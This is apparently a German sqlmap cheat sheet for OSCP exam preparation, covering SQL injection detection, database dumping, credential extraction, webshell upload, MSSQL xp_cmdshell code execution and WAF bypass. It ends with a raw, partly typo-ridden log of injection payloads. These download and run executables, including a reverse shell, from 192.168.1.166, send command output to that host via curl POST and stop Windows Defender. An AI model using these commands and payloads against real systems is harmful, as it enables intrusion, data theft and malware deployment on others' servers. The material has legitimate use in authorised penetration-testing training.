# sqlmap - Automatisiertes SQL Injection Tool

## Was ist sqlmap?

sqlmap ist ein Open-Source Penetration Testing Tool, das SQL Injection Vulnerabilities automatisch detected und exploitet. Unterstützt MySQL, PostgreSQL, MSSQL, Oracle, SQLite, und viele mehr.

---

## Installation

```bash
# Kali (pre-installed)
sqlmap -h

# Oder via apt
sudo apt install sqlmap

# Oder via git (latest)
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py -h
```

---

## Basis-Syntax

```bash
sqlmap -u "URL" [OPTIONS]
```

---

## Basic Usage

### 1. Einfacher URL-Test
```bash
# GET-Parameter testen
sqlmap -u "http://target.com/page.php?id=1"

# Alle Parameter testen
sqlmap -u "http://target.com/page.php?id=1&name=test" --batch
```

### 2. POST-Request (via Request File)
```bash
# Burp Suite Request speichern
# File: request.txt
"""
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=admin&password=test
"""

# Mit sqlmap verwenden
sqlmap -r request.txt --batch

# Spezifischen Parameter testen
sqlmap -r request.txt -p username --batch
```

### 3. POST-Request (Command Line)
```bash
# POST-Data direkt angeben
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# Spezifischen Parameter
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" -p username
```

---

## Wichtige Optionen

### Target Specification

```bash
# URL
-u "URL"                    # Target URL

# Request File
-r FILE                     # Load HTTP request from file

# POST Data
--data="data"               # POST data

# Cookie
--cookie="PHPSESSID=abc"    # HTTP Cookie header

# User-Agent
--user-agent="Mozilla/5.0"  # Custom User-Agent

# Referer
--referer="http://google.com"  # HTTP Referer header

# Headers
--headers="X-Forwarded-For: 1.1.1.1"  # Extra headers
```

### Detection & Enumeration

```bash
# Database
--dbs                       # Enumerate databases
--current-db                # Current database
--tables                    # Enumerate tables
--columns                   # Enumerate columns
--dump                      # Dump table data

# Specific Database
-D DATABASE                 # Target database
-T TABLE                    # Target table
-C COLUMN                   # Target column

# Users & Passwords
--users                     # Enumerate DBMS users
--passwords                 # Enumerate password hashes
--privileges                # Enumerate user privileges
```

### Injection Techniques

```bash
# Technique
--technique=BEUSTQ          # SQL injection techniques
# B = Boolean-based blind
# E = Error-based
# U = Union query-based
# S = Stacked queries
# T = Time-based blind
# Q = Inline queries

# Level & Risk
--level=LEVEL               # Level of tests (1-5, default 1)
--risk=RISK                 # Risk of tests (1-3, default 1)

# DBMS
--dbms=DBMS                 # Force DBMS (mysql, mssql, oracle, etc.)
```

### Output Options

```bash
# Verbosity
-v VERBOSE                  # Verbosity level (0-6)

# Batch Mode
--batch                     # Never ask for user input (use defaults)

# Flush Session
--flush-session             # Flush session files for current target
```

---

## Praktische Workflows

### Workflow 1: GET-Parameter SQLi Detection & Exploitation

```bash
# Step 1: Detect SQLi
sqlmap -u "http://target.com/page.php?id=1" --batch

# Step 2: Enumerate Databases
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

# Step 3: Current DB & Tables
sqlmap -u "http://target.com/page.php?id=1" --current-db --tables --batch

# Step 4: Dump specific table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump --batch

# Step 5: Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump --batch
```

### Workflow 2: POST-Login SQLi

```bash
# Step 1: Capture request in Burp, save to file
# request.txt:
"""
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
"""

# Step 2: Test for SQLi
sqlmap -r request.txt --batch

# Step 3: Dump database
sqlmap -r request.txt --dbs --batch
sqlmap -r request.txt -D dbname --tables --batch
sqlmap -r request.txt -D dbname -T users --dump --batch
```

### Workflow 3: Blind SQLi (Time-Based)

```bash
# Force time-based technique
sqlmap -u "http://target.com/page.php?id=1" --technique=T --batch

# Increase level for more payloads
sqlmap -u "http://target.com/page.php?id=1" --technique=T --level=5 --risk=3 --batch
```

---

## Advanced Features

### OS Shell Access

```bash
# Get OS Shell (if possible)
sqlmap -u "URL" --os-shell

# Requires:
# - DBMS user has FILE privileges
# - Web root is writable
# - Knows web root path

# Specify web root
sqlmap -u "URL" --os-shell --web-root="/var/www/html"
```

### File Read/Write

```bash
# Read file (Linux)
sqlmap -u "URL" --file-read="/etc/passwd"

# Read file (Windows)
sqlmap -u "URL" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Write file (webshell)
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### SQL Shell

```bash
# Get SQL shell
sqlmap -u "URL" --sql-shell

# Execute SQL queries interactively
```

### Tamper Scripts (WAF Bypass)

```bash
# Use tamper script
sqlmap -u "URL" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "URL" --tamper=space2comment,between

# Common tamper scripts:
# space2comment     - Replace space with /**/
# between           - Use BETWEEN for > comparisons
# charencode        - URL encode characters
# randomcase        - Randomize character case
# apostrophemask    - Replace apostrophe with UTF-8
```

### Authentication

```bash
# HTTP Basic Auth
sqlmap -u "URL" --auth-type=Basic --auth-cred="user:pass"

# HTTP Digest Auth
sqlmap -u "URL" --auth-type=Digest --auth-cred="user:pass"

# Cookie-based
sqlmap -u "URL" --cookie="PHPSESSID=abcd1234"

# Custom headers
sqlmap -u "URL" --headers="Authorization: Bearer TOKEN"
```

### Proxy & Tor

```bash
# HTTP Proxy
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# Burp Suite Proxy
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# Tor
sqlmap -u "URL" --tor --tor-type=SOCKS5

# Check Tor
sqlmap -u "URL" --tor --check-tor
```

---

## DBMS-Spezifische Features

### MySQL

```bash
# Enumerate
sqlmap -u "URL" --dbms=mysql --dbs

# Read file
sqlmap -u "URL" --dbms=mysql --file-read="/etc/passwd"

# Write webshell
sqlmap -u "URL" --dbms=mysql --file-write="shell.php" --file-dest="/var/www/html/s.php"

# MySQL user required: FILE privilege
```

### MSSQL (Microsoft SQL Server)

```bash
# Enumerate
sqlmap -u "URL" --dbms=mssql --dbs

# Enable xp_cmdshell
sqlmap -u "URL" --dbms=mssql --os-shell

# Manual xp_cmdshell (siehe unten)
```

#### MSSQL xp_cmdshell Manual Exploitation

```sql
# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute commands
EXEC xp_cmdshell 'whoami';

# Download file
EXEC xp_cmdshell 'certutil -urlcache -f http://ATTACKER/shell.exe C:\Temp\shell.exe';

# Execute reverse shell
EXEC xp_cmdshell 'C:\Temp\shell.exe';
```

#### MSSQL SQLi Payloads (Manual)

```sql
# Test
' OR 1=1--
' OR '1'='1'--
admin'--

# Union-based (adjust column count)
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,@@version,3--

# Stacked queries
'; EXEC xp_cmdshell 'whoami'--

# File download via certutil
'; EXEC xp_cmdshell 'certutil -urlcache -f http://IP/file.exe C:\Temp\file.exe'--

# PowerShell download
'; EXEC xp_cmdshell 'powershell -c "iwr http://IP/file.exe -o C:\Temp\file.exe"'--

# Execute downloaded file
'; EXEC xp_cmdshell 'C:\Temp\file.exe'--
```

### PostgreSQL

```bash
# Enumerate
sqlmap -u "URL" --dbms=postgresql --dbs

# Read file
sqlmap -u "URL" --dbms=postgresql --file-read="/etc/passwd"

# OS command (via large objects)
sqlmap -u "URL" --dbms=postgresql --os-shell
```

### Oracle

```bash
# Enumerate
sqlmap -u "URL" --dbms=oracle --dbs

# Schemas
sqlmap -u "URL" --dbms=oracle --schema

# Tables
sqlmap -u "URL" --dbms=oracle --tables
```

---

## OSCP-Spezifische Workflows

### Workflow 1: Quick Database Dump

```bash
# Fast enumeration
sqlmap -u "http://target.com/page.php?id=1" --batch --dump-all --exclude-sysdbs

# Exclude system databases
--exclude-sysdbs

# Threads (faster)
--threads=10
```

### Workflow 2: Webshell Upload

```bash
# Step 1: Create webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Step 2: Upload
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch

# Step 3: Access
curl "http://target.com/shell.php?cmd=whoami"
```

### Workflow 3: MSSQL to RCE

```bash
# Option 1: OS-Shell (automatic)
sqlmap -u "URL" --dbms=mssql --os-shell --batch

# Option 2: Manual xp_cmdshell
# Via SQLi: '; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
# Then: '; EXEC xp_cmdshell 'whoami';--
```

### Workflow 4: Credentials Extraction

```bash
# Dump users table
sqlmap -u "URL" -D webapp -T users -C username,password --dump --batch

# Crack hashes
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt  # MD5
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA256
```

---

## Tipps & Tricks

### 1. Session speichern
```bash
# sqlmap speichert Sessions in ~/.local/share/sqlmap/output/
# Beim zweiten Lauf nutzt es gespeicherte Infos

# Flush session (neue Tests)
sqlmap -u "URL" --flush-session
```

### 2. Faster Enumeration
```bash
# Threads
sqlmap -u "URL" --threads=10

# Skip banner
sqlmap -u "URL" --skip-banner

# No logging
sqlmap -u "URL" --disable-coloring
```

### 3. Output-Verzeichnis
```bash
# Custom output directory
sqlmap -u "URL" --output-dir=/tmp/sqlmap_output
```

### 4. WAF Detection & Bypass
```bash
# Identify WAF
sqlmap -u "URL" --identify-waf

# Random User-Agent
sqlmap -u "URL" --random-agent

# Tamper scripts
sqlmap -u "URL" --tamper=space2comment,between
```

### 5. Specific Parameter
```bash
# Test nur bestimmten Parameter
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id

# Skip bestimmten Parameter
sqlmap -u "http://target.com/page.php?id=1&name=test" --skip="name"
```

---

## Häufige Fehler & Lösungen

### "All tested parameters do not appear to be injectable"

```bash
# Solutions:
# 1. Increase level & risk
sqlmap -u "URL" --level=5 --risk=3

# 2. Force DBMS
sqlmap -u "URL" --dbms=mysql

# 3. Try different techniques
sqlmap -u "URL" --technique=T  # Time-based

# 4. Specify parameter
sqlmap -u "URL" -p id

# 5. Add cookie/headers
sqlmap -u "URL" --cookie="PHPSESSID=abc"
```

### "Connection timeout"

```bash
# Increase timeout
sqlmap -u "URL" --timeout=30

# Retry on error
sqlmap -u "URL" --retries=5
```

### "WAF detected"

```bash
# Tamper scripts
sqlmap -u "URL" --tamper=space2comment

# Random User-Agent
sqlmap -u "URL" --random-agent

# Delay between requests
sqlmap -u "URL" --delay=2
```

---

## Alternative SQL Injection Tools

### Manual Testing
```bash
# Burp Suite - Intruder
# Payloads: ' OR 1=1--, ' UNION SELECT NULL--, etc.

# curl
curl "http://target.com/page.php?id=1' OR 1=1--"
```

### NoSQLMap (NoSQL Injection)
```bash
# MongoDB, CouchDB, etc.
python3 nosqlmap.py -u "URL" --attack=1
```

---

## Quick Reference

### Basic Commands
```bash
# Simple test
sqlmap -u "URL" --batch

# POST request
sqlmap -r request.txt --batch

# Enumerate DBs
sqlmap -u "URL" --dbs --batch

# Dump table
sqlmap -u "URL" -D dbname -T users --dump --batch

# OS Shell
sqlmap -u "URL" --os-shell --batch

# File read
sqlmap -u "URL" --file-read="/etc/passwd"

# WAF bypass
sqlmap -u "URL" --tamper=space2comment --random-agent
```

### Important Flags
```bash
-u URL                  # Target URL
-r FILE                 # Request file
--data="data"           # POST data
-p PARAM                # Testable parameter
--dbs                   # Enumerate databases
--tables                # Enumerate tables
--dump                  # Dump table entries
--os-shell              # Get OS shell
--batch                 # Never ask for user input
--level=5               # Level (1-5)
--risk=3                # Risk (1-3)
--technique=BEUSTQ      # Techniques
--dbms=DBMS             # Force DBMS type
--tamper=SCRIPT         # Tamper script
```

---

## OSCP Exam Tips

1. **--batch ist essentiell** - Automatische Antworten auf Prompts
2. **Request-File nutzen** - Burp Request speichern, mit -r verwenden
3. **Level/Risk erhöhen** - Bei Problemen: `--level=5 --risk=3`
4. **MSSQL = xp_cmdshell** - Fast immer RCE möglich
5. **Webshell Upload** - `--file-write` + `--file-dest`
6. **Zeit beachten** - SQLi kann lange dauern, alternative Wege prüfen
7. **Session speichern** - sqlmap merkt sich Progress
8. **Manual Verification** - Immer Findings manuell testen

---

## Resources

- GitHub: https://github.com/sqlmapproject/sqlmap
- Wiki: https://github.com/sqlmapproject/sqlmap/wiki
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- HackTricks: https://book.hacktricks.xyz/pentesting-web/sql-injection

Payloads

sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
sqlmap -r post.txt --batch #discover
sqlmap -u http://$target/blindsqli.php?user=1 -p user --dump
sqlmap -u http://$target/blindsqli.php?user=1 -p user
--os-shell


s';exec xp_cmdshell "certutil -hashfile win64tcp.exe MD5" --

s';exec xp_cmdshell "bitsadmin /transfer jobname http://192.168.1.166:443/win64tcp.exe c:/temp/win64tcp.exe" --

s';exec xp_cmdshell "bitsadmin /transfer jobname http://192.168.1.166:443/win64tcp.exe c:/temp/win64tcp.exe" --

s';exec sp_confixgure 'xp_cmdshell'; --

s';exec xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.1..166:443/win64tcp.exe c:/temp/win64tcp.exe" --
s';exec xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.1..166:443/win64tcp.exe c:/win64tcp.exe" --
s';exec xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.1..166:443/win64tcp.exe c:/windows/system32/win64tcp.exe" --
s';exec xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.1..166:443/win64tcp.exe c:/users/public/desktop/win64tcp.exe" --
s';exec xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.1..166:443/win64tcp.exe win64tcp.exe" --

s';exec xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.1..166:443/win64tcp.exe c:/temp/win64https.exe" --
s';exec xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.1..166:443/win64tcp.exe c:/win64https.exe" --
s';exec xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.1..166:443/win64tcp.exe c:/windows/system32/win64https.exe" --
s';exec xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.1..166:443/win64tcp.exe c:/users/public/desktop/win64https.exe" --
s';exec xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.1..166:443/win64tcp.exe win64https.exe" --

-- Datei erstellen und senden:
s';exec xp_cmdshell "echo Test erfolgreich > c:\temp\test.txt && curl -X POST -d @c:\temp\test.txt http://192.168.1.166:443/recv"; --

-- Mit mehreren Zeilen:
s';exec xp_cmdshell "echo Zeile 1 > c:\temp\test.txt && echo Zeile 2 >> c:\temp\test.txt && curl -X POST -d @c:\temp\test.txt http://192.168.1.166:8080/recv"; --

s';exec xp_cmdshell 'dir > c:\temp\test1.txt && curl -X POST -d @c:\temp\test1.txt http://192.168.1.166:443/recv'; --

s';exec xp_cmdshell 'curl -X POST -d @c:\temp\win64tcp.exe http://192.168.1.166:443/recv'; --
s';exec xp_cmdshell 'curl -X POST -d @c:\temp\test.txt http://192.168.1.166:443/recv'; --


s';exec xp_cmdshell 'dir c:/tempp > c:\temp\test.txt && curl -X POST -d @c:\temp\win64tcp.txt http://192.168.1.166:443/recv'; --



s';exec xp_cmdshell "certutil.exe -urlcache -split -f http://192.168.1.166:444/win64tcp.exe win64tcp.exe" --
s';exec xp_cmdshell 'certutil.exe -urlcache -split -f http://192.168.1.166:444/win64tcp.exe win64tcp.exe > c:\temp\test1.txt && curl -X POST -d @c:\temp\test1.txt http://192.168.1.166:443/recv'; --


c:\temp\test11.txt &&

#Check Outputs
s';exec xp_cmdshell 'dir c:\temp\ > c:\temp\dir.txt && curl -X POST -d @c:\temp\dir.txt http://192.168.1.166:443/recv'; --

#Read Files
s';exec xp_cmdshell 'type c:\temp\w.exe > c:\temp\out.txt && curl -X POST -d @c:\temp\out.txt http://192.168.1.166:443/recv'; --
s';exec xp_cmdshell 'curl -X POST -d @c:\temp\out.txt http://192.168.1.166:443/recv'; --

#Execute Download and write logs

s';exec xp_cmdshell 'certutil.exe -urlcache -split -f http://192.168.1.166:5656/win64tcp.exe c:\temp\win64tcp.exe > c:\temp\test.txt'; --

s';exec xp_cmdshell 'curl -o c:\temp\win64tcp1.exe http://192.168.1.166:444/win64tcp.exe  > c:\temp\test.txt'; --
s';exec xp_cmdshell "powershell -c iwr 192.168.1.166:444/win64tcp.exe -o c:\temp\w.exe"; --

#Get Outputs
s';exec xp_cmdshell 'curl -X POST -d @c:\temp\test.txt http://192.168.1.166:443/recv'; --

s';exec xp_cmdshell 'certutil.exe -urlcache -split -f http://192.168.1.166:5656/xxx.txt c:\temp\xxx.txt > c:\temp\test.txt'; --

s';exec xp_cmdshell 'sc stop windefend > c:\temp\test.txt'; --
s';exec xp_cmdshell 'whoami > c:\temp\test.txt && curl -X POST -d @c:\temp\test.txt http://192.168.1.166:443/recv'; --


s';exec xp_cmdshell 'certutil.exe -urlcache -split -f http://192.168.1.166:444/reverse_shell.exe c:\temp\revshell.exe > c:\temp\test.txt'; --

s';exec xp_cmdshell "sc query windefend"; --
olume in drive C has no label. Volume Serial Number is DAF8-E4DD Directory of 
c:\temp09/16/2025  03:07 PM    
<DIR>          .09/16/2025  02:34 PM                 
4 1.txt09/16/2025  02:57 PM   0 test.txt
  09/16/2025  03:04 PM   202 test1.txt
  9/16/2025  03:06 PM 487 test11.txt
  09/16/2025  03:09 PM  0 test2.txt
09/16/2025  03:07 PM          0 win64tcp.exe          

  6 File(s)            693 bytes               1 Dir(s)  10,259,939,328 bytes free^C

s';exec xp_cmdshell "powershell -c $bytes = (Invoke-WebRequest -Uri http://192.168.1.166:444/win64tcp.exe).Content; [System.IO.File]::WriteAllBytes('$env:TEMP\win64tcp.exe', $bytes); & '$env:TEMP\win64tcp.exe'"; --